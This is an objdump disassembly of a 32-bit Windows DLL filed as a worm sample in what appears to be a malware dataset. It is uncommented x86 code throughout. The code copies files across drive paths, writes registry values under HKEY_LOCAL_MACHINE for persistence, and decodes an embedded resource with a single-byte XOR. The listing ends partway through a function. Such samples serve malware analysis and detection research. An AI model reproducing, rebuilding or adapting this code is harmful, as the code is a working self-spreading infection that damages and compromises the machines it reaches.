
malware_samples/worm/ead01383f9da349217fe53b2c3ac770c944861797678a8c374651e407ccdab66.dll:     file format pei-i386


Disassembly of section .text:

10001000 <.text>:
10001000:	8b 44 24 04          	mov    0x4(%esp),%eax
10001004:	56                   	push   %esi
10001005:	83 ce ff             	or     $0xffffffff,%esi
10001008:	85 c0                	test   %eax,%eax
1000100a:	74 2b                	je     0x10001037
1000100c:	80 78 1a 00          	cmpb   $0x0,0x1a(%eax)
10001010:	74 25                	je     0x10001037
10001012:	ff b0 99 02 00 00    	push   0x299(%eax)
10001018:	05 9d 02 00 00       	add    $0x29d,%eax
1000101d:	50                   	push   %eax
1000101e:	6a 03                	push   $0x3
10001020:	6a 00                	push   $0x0
10001022:	68 10 00 01 10       	push   $0x10010010
10001027:	ff 74 24 20          	push   0x20(%esp)
1000102b:	ff 15 4c e0 00 10    	call   *0x1000e04c
10001031:	85 c0                	test   %eax,%eax
10001033:	75 02                	jne    0x10001037
10001035:	33 f6                	xor    %esi,%esi
10001037:	8b c6                	mov    %esi,%eax
10001039:	5e                   	pop    %esi
1000103a:	c3                   	ret
1000103b:	56                   	push   %esi
1000103c:	8b 74 24 0c          	mov    0xc(%esp),%esi
10001040:	57                   	push   %edi
10001041:	83 cf ff             	or     $0xffffffff,%edi
10001044:	ff 74 24 14          	push   0x14(%esp)
10001048:	6a 00                	push   $0x0
1000104a:	56                   	push   %esi
1000104b:	e8 c6 c2 00 00       	call   0x1000d316
10001050:	83 c4 0c             	add    $0xc,%esp
10001053:	ff 74 24 14          	push   0x14(%esp)
10001057:	56                   	push   %esi
10001058:	68 20 00 01 10       	push   $0x10010020
1000105d:	ff 15 6c e1 00 10    	call   *0x1000e16c
10001063:	85 c0                	test   %eax,%eax
10001065:	74 1a                	je     0x10001081
10001067:	68 14 00 01 10       	push   $0x10010014
1000106c:	56                   	push   %esi
1000106d:	e8 9e c2 00 00       	call   0x1000d310
10001072:	ff 74 24 14          	push   0x14(%esp)
10001076:	56                   	push   %esi
10001077:	e8 94 c2 00 00       	call   0x1000d310
1000107c:	83 c4 10             	add    $0x10,%esp
1000107f:	33 ff                	xor    %edi,%edi
10001081:	8b c7                	mov    %edi,%eax
10001083:	5f                   	pop    %edi
10001084:	5e                   	pop    %esi
10001085:	c3                   	ret
10001086:	ff 74 24 0c          	push   0xc(%esp)
1000108a:	8b 44 24 08          	mov    0x8(%esp),%eax
1000108e:	05 60 01 00 00       	add    $0x160,%eax
10001093:	ff 74 24 0c          	push   0xc(%esp)
10001097:	50                   	push   %eax
10001098:	e8 9e ff ff ff       	call   0x1000103b
1000109d:	83 c4 0c             	add    $0xc,%esp
100010a0:	c3                   	ret
100010a1:	55                   	push   %ebp
100010a2:	8b ec                	mov    %esp,%ebp
100010a4:	b8 58 0b 01 00       	mov    $0x10b58,%eax
100010a9:	e8 82 c2 00 00       	call   0x1000d330
100010ae:	80 a5 c0 fd ff ff 00 	andb   $0x0,-0x240(%ebp)
100010b5:	56                   	push   %esi
100010b6:	57                   	push   %edi
100010b7:	6a 41                	push   $0x41
100010b9:	59                   	pop    %ecx
100010ba:	33 c0                	xor    %eax,%eax
100010bc:	20 85 b8 fc ff ff    	and    %al,-0x348(%ebp)
100010c2:	8d bd c1 fd ff ff    	lea    -0x23f(%ebp),%edi
100010c8:	f3 ab                	rep stos %eax,%es:(%edi)
100010ca:	6a 41                	push   $0x41
100010cc:	8d bd b9 fc ff ff    	lea    -0x347(%ebp),%edi
100010d2:	59                   	pop    %ecx
100010d3:	c6 85 c8 fe ff ff 99 	movb   $0x99,-0x138(%ebp)
100010da:	f3 ab                	rep stos %eax,%es:(%edi)
100010dc:	6a 40                	push   $0x40
100010de:	8d bd cb fe ff ff    	lea    -0x135(%ebp),%edi
100010e4:	59                   	pop    %ecx
100010e5:	c6 85 c9 fe ff ff 3a 	movb   $0x3a,-0x137(%ebp)
100010ec:	c6 85 ca fe ff ff 5c 	movb   $0x5c,-0x136(%ebp)
100010f3:	80 65 e0 00          	andb   $0x0,-0x20(%ebp)
100010f7:	f3 ab                	rep stos %eax,%es:(%edi)
100010f9:	66 ab                	stos   %ax,%es:(%edi)
100010fb:	33 c0                	xor    %eax,%eax
100010fd:	8d 7d e1             	lea    -0x1f(%ebp),%edi
10001100:	ab                   	stos   %eax,%es:(%edi)
10001101:	ab                   	stos   %eax,%es:(%edi)
10001102:	ab                   	stos   %eax,%es:(%edi)
10001103:	80 65 d0 00          	andb   $0x0,-0x30(%ebp)
10001107:	80 65 f0 00          	andb   $0x0,-0x10(%ebp)
1000110b:	66 ab                	stos   %ax,%es:(%edi)
1000110d:	aa                   	stos   %al,%es:(%edi)
1000110e:	33 c0                	xor    %eax,%eax
10001110:	8d 7d d1             	lea    -0x2f(%ebp),%edi
10001113:	ab                   	stos   %eax,%es:(%edi)
10001114:	ab                   	stos   %eax,%es:(%edi)
10001115:	ab                   	stos   %eax,%es:(%edi)
10001116:	66 ab                	stos   %ax,%es:(%edi)
10001118:	aa                   	stos   %al,%es:(%edi)
10001119:	33 c0                	xor    %eax,%eax
1000111b:	8d 7d f1             	lea    -0xf(%ebp),%edi
1000111e:	ab                   	stos   %eax,%es:(%edi)
1000111f:	ab                   	stos   %eax,%es:(%edi)
10001120:	ab                   	stos   %eax,%es:(%edi)
10001121:	80 a5 a8 f4 fe ff 00 	andb   $0x0,-0x10b58(%ebp)
10001128:	b9 03 42 00 00       	mov    $0x4203,%ecx
1000112d:	66 ab                	stos   %ax,%es:(%edi)
1000112f:	aa                   	stos   %al,%es:(%edi)
10001130:	33 c0                	xor    %eax,%eax
10001132:	8d bd a9 f4 fe ff    	lea    -0x10b57(%ebp),%edi
10001138:	f3 ab                	rep stos %eax,%es:(%edi)
1000113a:	8b 75 08             	mov    0x8(%ebp),%esi
1000113d:	66 ab                	stos   %ax,%es:(%edi)
1000113f:	85 f6                	test   %esi,%esi
10001141:	aa                   	stos   %al,%es:(%edi)
10001142:	75 08                	jne    0x1000114c
10001144:	83 c8 ff             	or     $0xffffffff,%eax
10001147:	e9 a0 01 00 00       	jmp    0x100012ec
1000114c:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
10001152:	68 05 01 00 00       	push   $0x105
10001157:	50                   	push   %eax
10001158:	68 20 00 01 10       	push   $0x10010020
1000115d:	ff 15 6c e1 00 10    	call   *0x1000e16c
10001163:	85 c0                	test   %eax,%eax
10001165:	75 0b                	jne    0x10001172
10001167:	ff 15 60 e1 00 10    	call   *0x1000e160
1000116d:	e9 7a 01 00 00       	jmp    0x100012ec
10001172:	53                   	push   %ebx
10001173:	8d 86 60 01 00 00    	lea    0x160(%esi),%eax
10001179:	6a 10                	push   $0x10
1000117b:	50                   	push   %eax
1000117c:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000117f:	50                   	push   %eax
10001180:	e8 97 c1 00 00       	call   0x1000d31c
10001185:	8d 86 70 01 00 00    	lea    0x170(%esi),%eax
1000118b:	6a 10                	push   $0x10
1000118d:	50                   	push   %eax
1000118e:	8d 45 f0             	lea    -0x10(%ebp),%eax
10001191:	50                   	push   %eax
10001192:	e8 85 c1 00 00       	call   0x1000d31c
10001197:	81 c6 50 01 00 00    	add    $0x150,%esi
1000119d:	6a 10                	push   $0x10
1000119f:	8d 45 d0             	lea    -0x30(%ebp),%eax
100011a2:	56                   	push   %esi
100011a3:	50                   	push   %eax
100011a4:	e8 73 c1 00 00       	call   0x1000d31c
100011a9:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
100011af:	68 14 00 01 10       	push   $0x10010014
100011b4:	50                   	push   %eax
100011b5:	e8 56 c1 00 00       	call   0x1000d310
100011ba:	be 04 01 00 00       	mov    $0x104,%esi
100011bf:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
100011c5:	56                   	push   %esi
100011c6:	50                   	push   %eax
100011c7:	8d 85 b8 fc ff ff    	lea    -0x348(%ebp),%eax
100011cd:	50                   	push   %eax
100011ce:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
100011d4:	8d 45 f0             	lea    -0x10(%ebp),%eax
100011d7:	50                   	push   %eax
100011d8:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
100011de:	50                   	push   %eax
100011df:	e8 2c c1 00 00       	call   0x1000d310
100011e4:	83 c4 40             	add    $0x40,%esp
100011e7:	8d 45 e0             	lea    -0x20(%ebp),%eax
100011ea:	50                   	push   %eax
100011eb:	8d 85 b8 fc ff ff    	lea    -0x348(%ebp),%eax
100011f1:	50                   	push   %eax
100011f2:	e8 19 c1 00 00       	call   0x1000d310
100011f7:	8d 45 f4             	lea    -0xc(%ebp),%eax
100011fa:	50                   	push   %eax
100011fb:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
10001201:	50                   	push   %eax
10001202:	ff 15 b0 e1 00 10    	call   *0x1000e1b0
10001208:	8b f8                	mov    %eax,%edi
1000120a:	8a 45 0c             	mov    0xc(%ebp),%al
1000120d:	83 c4 10             	add    $0x10,%esp
10001210:	4f                   	dec    %edi
10001211:	88 85 c8 fe ff ff    	mov    %al,-0x138(%ebp)
10001217:	8d 9d ac f5 fe ff    	lea    -0x10a54(%ebp),%ebx
1000121d:	c7 45 0c 07 00 00 00 	movl   $0x7,0xc(%ebp)
10001224:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
1000122a:	56                   	push   %esi
1000122b:	50                   	push   %eax
1000122c:	8d 83 fc fe ff ff    	lea    -0x104(%ebx),%eax
10001232:	50                   	push   %eax
10001233:	e8 e4 c0 00 00       	call   0x1000d31c
10001238:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000123b:	56                   	push   %esi
1000123c:	50                   	push   %eax
1000123d:	8d 85 ca fe ff ff    	lea    -0x136(%ebp),%eax
10001243:	50                   	push   %eax
10001244:	e8 d3 c0 00 00       	call   0x1000d31c
10001249:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
1000124f:	56                   	push   %esi
10001250:	50                   	push   %eax
10001251:	53                   	push   %ebx
10001252:	e8 c5 c0 00 00       	call   0x1000d31c
10001257:	83 c4 24             	add    $0x24,%esp
1000125a:	fe 45 f3             	incb   -0xd(%ebp)
1000125d:	fe 07                	incb   (%edi)
1000125f:	81 c3 08 02 00 00    	add    $0x208,%ebx
10001265:	ff 4d 0c             	decl   0xc(%ebp)
10001268:	75 ba                	jne    0x10001224
1000126a:	8d 85 b8 fc ff ff    	lea    -0x348(%ebp),%eax
10001270:	56                   	push   %esi
10001271:	50                   	push   %eax
10001272:	8d 85 e0 02 ff ff    	lea    -0xfd20(%ebp),%eax
10001278:	50                   	push   %eax
10001279:	e8 9e c0 00 00       	call   0x1000d31c
1000127e:	8d 45 d0             	lea    -0x30(%ebp),%eax
10001281:	56                   	push   %esi
10001282:	50                   	push   %eax
10001283:	8d 85 ca fe ff ff    	lea    -0x136(%ebp),%eax
10001289:	50                   	push   %eax
1000128a:	e8 8d c0 00 00       	call   0x1000d31c
1000128f:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
10001295:	56                   	push   %esi
10001296:	50                   	push   %eax
10001297:	8d 85 e4 03 ff ff    	lea    -0xfc1c(%ebp),%eax
1000129d:	50                   	push   %eax
1000129e:	e8 79 c0 00 00       	call   0x1000d31c
100012a3:	8b 3d 64 e1 00 10    	mov    0x1000e164,%edi
100012a9:	83 c4 24             	add    $0x24,%esp
100012ac:	8d b5 ac f5 fe ff    	lea    -0x10a54(%ebp),%esi
100012b2:	6a 08                	push   $0x8
100012b4:	5b                   	pop    %ebx
100012b5:	80 7d 10 03          	cmpb   $0x3,0x10(%ebp)
100012b9:	6a 00                	push   $0x0
100012bb:	75 0a                	jne    0x100012c7
100012bd:	8d 86 fc fe ff ff    	lea    -0x104(%esi),%eax
100012c3:	56                   	push   %esi
100012c4:	50                   	push   %eax
100012c5:	eb 08                	jmp    0x100012cf
100012c7:	8d 86 fc fe ff ff    	lea    -0x104(%esi),%eax
100012cd:	50                   	push   %eax
100012ce:	56                   	push   %esi
100012cf:	ff d7                	call   *%edi
100012d1:	81 c6 08 02 00 00    	add    $0x208,%esi
100012d7:	4b                   	dec    %ebx
100012d8:	75 db                	jne    0x100012b5
100012da:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
100012e0:	6a 06                	push   $0x6
100012e2:	50                   	push   %eax
100012e3:	ff 15 68 e1 00 10    	call   *0x1000e168
100012e9:	33 c0                	xor    %eax,%eax
100012eb:	5b                   	pop    %ebx
100012ec:	5f                   	pop    %edi
100012ed:	5e                   	pop    %esi
100012ee:	c9                   	leave
100012ef:	c3                   	ret
100012f0:	55                   	push   %ebp
100012f1:	8b ec                	mov    %esp,%ebp
100012f3:	b8 58 0b 01 00       	mov    $0x10b58,%eax
100012f8:	e8 33 c0 00 00       	call   0x1000d330
100012fd:	56                   	push   %esi
100012fe:	57                   	push   %edi
100012ff:	6a 41                	push   $0x41
10001301:	33 d2                	xor    %edx,%edx
10001303:	59                   	pop    %ecx
10001304:	33 c0                	xor    %eax,%eax
10001306:	8d bd c9 fe ff ff    	lea    -0x137(%ebp),%edi
1000130c:	88 95 c8 fe ff ff    	mov    %dl,-0x138(%ebp)
10001312:	f3 ab                	rep stos %eax,%es:(%edi)
10001314:	6a 41                	push   $0x41
10001316:	8d bd b9 fc ff ff    	lea    -0x347(%ebp),%edi
1000131c:	59                   	pop    %ecx
1000131d:	88 95 b8 fc ff ff    	mov    %dl,-0x348(%ebp)
10001323:	f3 ab                	rep stos %eax,%es:(%edi)
10001325:	6a 40                	push   $0x40
10001327:	8d bd c3 fd ff ff    	lea    -0x23d(%ebp),%edi
1000132d:	59                   	pop    %ecx
1000132e:	c6 85 c0 fd ff ff 99 	movb   $0x99,-0x240(%ebp)
10001335:	c6 85 c1 fd ff ff 3a 	movb   $0x3a,-0x23f(%ebp)
1000133c:	c6 85 c2 fd ff ff 5c 	movb   $0x5c,-0x23e(%ebp)
10001343:	f3 ab                	rep stos %eax,%es:(%edi)
10001345:	66 ab                	stos   %ax,%es:(%edi)
10001347:	33 c0                	xor    %eax,%eax
10001349:	8d 7d e1             	lea    -0x1f(%ebp),%edi
1000134c:	88 55 e0             	mov    %dl,-0x20(%ebp)
1000134f:	88 55 d0             	mov    %dl,-0x30(%ebp)
10001352:	ab                   	stos   %eax,%es:(%edi)
10001353:	ab                   	stos   %eax,%es:(%edi)
10001354:	ab                   	stos   %eax,%es:(%edi)
10001355:	66 ab                	stos   %ax,%es:(%edi)
10001357:	aa                   	stos   %al,%es:(%edi)
10001358:	33 c0                	xor    %eax,%eax
1000135a:	8d 7d d1             	lea    -0x2f(%ebp),%edi
1000135d:	ab                   	stos   %eax,%es:(%edi)
1000135e:	ab                   	stos   %eax,%es:(%edi)
1000135f:	ab                   	stos   %eax,%es:(%edi)
10001360:	66 ab                	stos   %ax,%es:(%edi)
10001362:	aa                   	stos   %al,%es:(%edi)
10001363:	33 c0                	xor    %eax,%eax
10001365:	8d 7d f1             	lea    -0xf(%ebp),%edi
10001368:	88 55 f0             	mov    %dl,-0x10(%ebp)
1000136b:	b9 03 42 00 00       	mov    $0x4203,%ecx
10001370:	ab                   	stos   %eax,%es:(%edi)
10001371:	ab                   	stos   %eax,%es:(%edi)
10001372:	ab                   	stos   %eax,%es:(%edi)
10001373:	66 ab                	stos   %ax,%es:(%edi)
10001375:	aa                   	stos   %al,%es:(%edi)
10001376:	33 c0                	xor    %eax,%eax
10001378:	8d bd a9 f4 fe ff    	lea    -0x10b57(%ebp),%edi
1000137e:	88 95 a8 f4 fe ff    	mov    %dl,-0x10b58(%ebp)
10001384:	8b 75 08             	mov    0x8(%ebp),%esi
10001387:	f3 ab                	rep stos %eax,%es:(%edi)
10001389:	66 ab                	stos   %ax,%es:(%edi)
1000138b:	3b f2                	cmp    %edx,%esi
1000138d:	aa                   	stos   %al,%es:(%edi)
1000138e:	75 08                	jne    0x10001398
10001390:	83 c8 ff             	or     $0xffffffff,%eax
10001393:	e9 2d 01 00 00       	jmp    0x100014c5
10001398:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
1000139e:	68 05 01 00 00       	push   $0x105
100013a3:	50                   	push   %eax
100013a4:	68 20 00 01 10       	push   $0x10010020
100013a9:	ff 15 6c e1 00 10    	call   *0x1000e16c
100013af:	85 c0                	test   %eax,%eax
100013b1:	75 0b                	jne    0x100013be
100013b3:	ff 15 60 e1 00 10    	call   *0x1000e160
100013b9:	e9 07 01 00 00       	jmp    0x100014c5
100013be:	53                   	push   %ebx
100013bf:	8d 86 60 01 00 00    	lea    0x160(%esi),%eax
100013c5:	6a 10                	push   $0x10
100013c7:	50                   	push   %eax
100013c8:	8d 45 e0             	lea    -0x20(%ebp),%eax
100013cb:	50                   	push   %eax
100013cc:	e8 4b bf 00 00       	call   0x1000d31c
100013d1:	8d 86 70 01 00 00    	lea    0x170(%esi),%eax
100013d7:	6a 10                	push   $0x10
100013d9:	50                   	push   %eax
100013da:	8d 45 f0             	lea    -0x10(%ebp),%eax
100013dd:	50                   	push   %eax
100013de:	e8 39 bf 00 00       	call   0x1000d31c
100013e3:	81 c6 50 01 00 00    	add    $0x150,%esi
100013e9:	6a 10                	push   $0x10
100013eb:	8d 45 d0             	lea    -0x30(%ebp),%eax
100013ee:	56                   	push   %esi
100013ef:	50                   	push   %eax
100013f0:	e8 27 bf 00 00       	call   0x1000d31c
100013f5:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
100013fb:	68 14 00 01 10       	push   $0x10010014
10001400:	50                   	push   %eax
10001401:	e8 0a bf 00 00       	call   0x1000d310
10001406:	be 04 01 00 00       	mov    $0x104,%esi
1000140b:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
10001411:	56                   	push   %esi
10001412:	50                   	push   %eax
10001413:	8d 85 b8 fc ff ff    	lea    -0x348(%ebp),%eax
10001419:	50                   	push   %eax
1000141a:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10001420:	8d 45 f0             	lea    -0x10(%ebp),%eax
10001423:	50                   	push   %eax
10001424:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
1000142a:	50                   	push   %eax
1000142b:	e8 e0 be 00 00       	call   0x1000d310
10001430:	83 c4 40             	add    $0x40,%esp
10001433:	8d 45 e0             	lea    -0x20(%ebp),%eax
10001436:	50                   	push   %eax
10001437:	8d 85 b8 fc ff ff    	lea    -0x348(%ebp),%eax
1000143d:	50                   	push   %eax
1000143e:	e8 cd be 00 00       	call   0x1000d310
10001443:	8d 45 f4             	lea    -0xc(%ebp),%eax
10001446:	50                   	push   %eax
10001447:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
1000144d:	50                   	push   %eax
1000144e:	ff 15 b0 e1 00 10    	call   *0x1000e1b0
10001454:	8b f8                	mov    %eax,%edi
10001456:	8a 45 0c             	mov    0xc(%ebp),%al
10001459:	83 c4 10             	add    $0x10,%esp
1000145c:	4f                   	dec    %edi
1000145d:	88 85 c0 fd ff ff    	mov    %al,-0x240(%ebp)
10001463:	8d 9d a8 f4 fe ff    	lea    -0x10b58(%ebp),%ebx
10001469:	c7 45 0c 07 00 00 00 	movl   $0x7,0xc(%ebp)
10001470:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
10001476:	56                   	push   %esi
10001477:	50                   	push   %eax
10001478:	53                   	push   %ebx
10001479:	e8 9e be 00 00       	call   0x1000d31c
1000147e:	8d 45 f0             	lea    -0x10(%ebp),%eax
10001481:	56                   	push   %esi
10001482:	50                   	push   %eax
10001483:	8d 85 c2 fd ff ff    	lea    -0x23e(%ebp),%eax
10001489:	50                   	push   %eax
1000148a:	e8 8d be 00 00       	call   0x1000d31c
1000148f:	83 c4 18             	add    $0x18,%esp
10001492:	fe 45 f3             	incb   -0xd(%ebp)
10001495:	fe 07                	incb   (%edi)
10001497:	03 de                	add    %esi,%ebx
10001499:	ff 4d 0c             	decl   0xc(%ebp)
1000149c:	75 d2                	jne    0x10001470
1000149e:	8b 35 5c e1 00 10    	mov    0x1000e15c,%esi
100014a4:	6a 04                	push   $0x4
100014a6:	8d bd a8 f4 fe ff    	lea    -0x10b58(%ebp),%edi
100014ac:	5b                   	pop    %ebx
100014ad:	57                   	push   %edi
100014ae:	ff d6                	call   *%esi
100014b0:	81 c7 08 02 00 00    	add    $0x208,%edi
100014b6:	4b                   	dec    %ebx
100014b7:	75 f4                	jne    0x100014ad
100014b9:	8d 85 b8 fc ff ff    	lea    -0x348(%ebp),%eax
100014bf:	50                   	push   %eax
100014c0:	ff d6                	call   *%esi
100014c2:	33 c0                	xor    %eax,%eax
100014c4:	5b                   	pop    %ebx
100014c5:	5f                   	pop    %edi
100014c6:	5e                   	pop    %esi
100014c7:	c9                   	leave
100014c8:	c3                   	ret
100014c9:	55                   	push   %ebp
100014ca:	8b ec                	mov    %esp,%ebp
100014cc:	81 ec 14 01 00 00    	sub    $0x114,%esp
100014d2:	53                   	push   %ebx
100014d3:	8d 45 fc             	lea    -0x4(%ebp),%eax
100014d6:	56                   	push   %esi
100014d7:	33 db                	xor    %ebx,%ebx
100014d9:	50                   	push   %eax
100014da:	33 f6                	xor    %esi,%esi
100014dc:	89 5d fc             	mov    %ebx,-0x4(%ebp)
100014df:	e8 13 01 00 00       	call   0x100015f7
100014e4:	85 c0                	test   %eax,%eax
100014e6:	59                   	pop    %ecx
100014e7:	0f 85 04 01 00 00    	jne    0x100015f1
100014ed:	38 1d 58 07 01 10    	cmp    %bl,0x10010758
100014f3:	8b 45 fc             	mov    -0x4(%ebp),%eax
100014f6:	75 11                	jne    0x10001509
100014f8:	0f b6 48 1a          	movzbl 0x1a(%eax),%ecx
100014fc:	89 0d 54 07 01 10    	mov    %ecx,0x10010754
10001502:	c6 05 58 07 01 10 01 	movb   $0x1,0x10010758
10001509:	39 1d 54 07 01 10    	cmp    %ebx,0x10010754
1000150f:	0f 84 dc 00 00 00    	je     0x100015f1
10001515:	6a 03                	push   $0x3
10001517:	ff 75 08             	push   0x8(%ebp)
1000151a:	50                   	push   %eax
1000151b:	e8 81 fb ff ff       	call   0x100010a1
10001520:	83 c4 0c             	add    $0xc,%esp
10001523:	ff 0d 54 07 01 10    	decl   0x10010754
10001529:	8b f0                	mov    %eax,%esi
1000152b:	0f 85 c0 00 00 00    	jne    0x100015f1
10001531:	8b 55 fc             	mov    -0x4(%ebp),%edx
10001534:	38 5a 20             	cmp    %bl,0x20(%edx)
10001537:	0f 84 a7 00 00 00    	je     0x100015e4
1000153d:	a0 6c 07 01 10       	mov    0x1001076c,%al
10001542:	57                   	push   %edi
10001543:	88 45 f8             	mov    %al,-0x8(%ebp)
10001546:	33 c0                	xor    %eax,%eax
10001548:	8d 7d f9             	lea    -0x7(%ebp),%edi
1000154b:	6a 40                	push   $0x40
1000154d:	66 ab                	stos   %ax,%es:(%edi)
1000154f:	59                   	pop    %ecx
10001550:	8d bd ed fe ff ff    	lea    -0x113(%ebp),%edi
10001556:	88 9d ec fe ff ff    	mov    %bl,-0x114(%ebp)
1000155c:	83 4d f0 ff          	orl    $0xffffffff,-0x10(%ebp)
10001560:	f3 ab                	rep stos %eax,%es:(%edi)
10001562:	66 ab                	stos   %ax,%es:(%edi)
10001564:	aa                   	stos   %al,%es:(%edi)
10001565:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
1000156b:	68 04 01 00 00       	push   $0x104
10001570:	83 c2 21             	add    $0x21,%edx
10001573:	50                   	push   %eax
10001574:	52                   	push   %edx
10001575:	e8 c1 fa ff ff       	call   0x1000103b
1000157a:	83 c4 0c             	add    $0xc,%esp
1000157d:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
10001583:	50                   	push   %eax
10001584:	ff 15 5c e1 00 10    	call   *0x1000e15c
1000158a:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000158d:	50                   	push   %eax
1000158e:	8d 45 f4             	lea    -0xc(%ebp),%eax
10001591:	50                   	push   %eax
10001592:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001595:	53                   	push   %ebx
10001596:	68 3f 00 0f 00       	push   $0xf003f
1000159b:	53                   	push   %ebx
1000159c:	53                   	push   %ebx
1000159d:	83 c0 31             	add    $0x31,%eax
100015a0:	53                   	push   %ebx
100015a1:	50                   	push   %eax
100015a2:	68 02 00 00 80       	push   $0x80000002
100015a7:	ff 15 44 e0 00 10    	call   *0x1000e044
100015ad:	8b f0                	mov    %eax,%esi
100015af:	5f                   	pop    %edi
100015b0:	3b f3                	cmp    %ebx,%esi
100015b2:	75 30                	jne    0x100015e4
100015b4:	8d 45 f8             	lea    -0x8(%ebp),%eax
100015b7:	50                   	push   %eax
100015b8:	e8 a3 bd 00 00       	call   0x1000d360
100015bd:	59                   	pop    %ecx
100015be:	40                   	inc    %eax
100015bf:	50                   	push   %eax
100015c0:	8d 45 f8             	lea    -0x8(%ebp),%eax
100015c3:	50                   	push   %eax
100015c4:	8b 45 fc             	mov    -0x4(%ebp),%eax
100015c7:	6a 01                	push   $0x1
100015c9:	05 30 01 00 00       	add    $0x130,%eax
100015ce:	53                   	push   %ebx
100015cf:	50                   	push   %eax
100015d0:	ff 75 f4             	push   -0xc(%ebp)
100015d3:	ff 15 4c e0 00 10    	call   *0x1000e04c
100015d9:	ff 75 f4             	push   -0xc(%ebp)
100015dc:	8b f0                	mov    %eax,%esi
100015de:	ff 15 48 e0 00 10    	call   *0x1000e048
100015e4:	ff 75 08             	push   0x8(%ebp)
100015e7:	ff 75 fc             	push   -0x4(%ebp)
100015ea:	e8 01 fd ff ff       	call   0x100012f0
100015ef:	59                   	pop    %ecx
100015f0:	59                   	pop    %ecx
100015f1:	8b c6                	mov    %esi,%eax
100015f3:	5e                   	pop    %esi
100015f4:	5b                   	pop    %ebx
100015f5:	c9                   	leave
100015f6:	c3                   	ret
100015f7:	53                   	push   %ebx
100015f8:	55                   	push   %ebp
100015f9:	56                   	push   %esi
100015fa:	57                   	push   %edi
100015fb:	68 28 00 01 10       	push   $0x10010028
10001600:	6a 65                	push   $0x65
10001602:	ff 35 50 07 01 10    	push   0x10010750
10001608:	83 cd ff             	or     $0xffffffff,%ebp
1000160b:	ff 15 4c e1 00 10    	call   *0x1000e14c
10001611:	8b f0                	mov    %eax,%esi
10001613:	85 f6                	test   %esi,%esi
10001615:	74 71                	je     0x10001688
10001617:	56                   	push   %esi
10001618:	ff 35 50 07 01 10    	push   0x10010750
1000161e:	ff 15 50 e1 00 10    	call   *0x1000e150
10001624:	8b d8                	mov    %eax,%ebx
10001626:	85 db                	test   %ebx,%ebx
10001628:	74 5e                	je     0x10001688
1000162a:	56                   	push   %esi
1000162b:	ff 35 50 07 01 10    	push   0x10010750
10001631:	ff 15 54 e1 00 10    	call   *0x1000e154
10001637:	8b f8                	mov    %eax,%edi
10001639:	57                   	push   %edi
1000163a:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10001640:	8b 74 24 18          	mov    0x18(%esp),%esi
10001644:	59                   	pop    %ecx
10001645:	85 c0                	test   %eax,%eax
10001647:	89 06                	mov    %eax,(%esi)
10001649:	74 45                	je     0x10001690
1000164b:	57                   	push   %edi
1000164c:	6a 00                	push   $0x0
1000164e:	50                   	push   %eax
1000164f:	e8 c2 bc 00 00       	call   0x1000d316
10001654:	83 c4 0c             	add    $0xc,%esp
10001657:	53                   	push   %ebx
10001658:	ff 15 58 e1 00 10    	call   *0x1000e158
1000165e:	85 c0                	test   %eax,%eax
10001660:	74 2e                	je     0x10001690
10001662:	57                   	push   %edi
10001663:	50                   	push   %eax
10001664:	ff 36                	push   (%esi)
10001666:	e8 b1 bc 00 00       	call   0x1000d31c
1000166b:	b9 2c 06 00 00       	mov    $0x62c,%ecx
10001670:	83 c4 0c             	add    $0xc,%esp
10001673:	3b f9                	cmp    %ecx,%edi
10001675:	75 19                	jne    0x10001690
10001677:	8b 36                	mov    (%esi),%esi
10001679:	33 c0                	xor    %eax,%eax
1000167b:	80 34 06 cd          	xorb   $0xcd,(%esi,%eax,1)
1000167f:	40                   	inc    %eax
10001680:	3b c1                	cmp    %ecx,%eax
10001682:	72 f7                	jb     0x1000167b
10001684:	33 ed                	xor    %ebp,%ebp
10001686:	eb 08                	jmp    0x10001690
10001688:	ff 15 60 e1 00 10    	call   *0x1000e160
1000168e:	8b e8                	mov    %eax,%ebp
10001690:	5f                   	pop    %edi
10001691:	8b c5                	mov    %ebp,%eax
10001693:	5e                   	pop    %esi
10001694:	5d                   	pop    %ebp
10001695:	5b                   	pop    %ebx
10001696:	c3                   	ret
10001697:	55                   	push   %ebp
10001698:	8b ec                	mov    %esp,%ebp
1000169a:	81 ec 04 01 00 00    	sub    $0x104,%esp
100016a0:	56                   	push   %esi
100016a1:	8b 75 08             	mov    0x8(%ebp),%esi
100016a4:	57                   	push   %edi
100016a5:	83 cf ff             	or     $0xffffffff,%edi
100016a8:	85 f6                	test   %esi,%esi
100016aa:	74 71                	je     0x1000171d
100016ac:	80 a5 fc fe ff ff 00 	andb   $0x0,-0x104(%ebp)
100016b3:	6a 40                	push   $0x40
100016b5:	59                   	pop    %ecx
100016b6:	33 c0                	xor    %eax,%eax
100016b8:	8d bd fd fe ff ff    	lea    -0x103(%ebp),%edi
100016be:	6a 02                	push   $0x2
100016c0:	ff 75 0c             	push   0xc(%ebp)
100016c3:	f3 ab                	rep stos %eax,%es:(%edi)
100016c5:	66 ab                	stos   %ax,%es:(%edi)
100016c7:	56                   	push   %esi
100016c8:	aa                   	stos   %al,%es:(%edi)
100016c9:	e8 d3 f9 ff ff       	call   0x100010a1
100016ce:	8b f8                	mov    %eax,%edi
100016d0:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
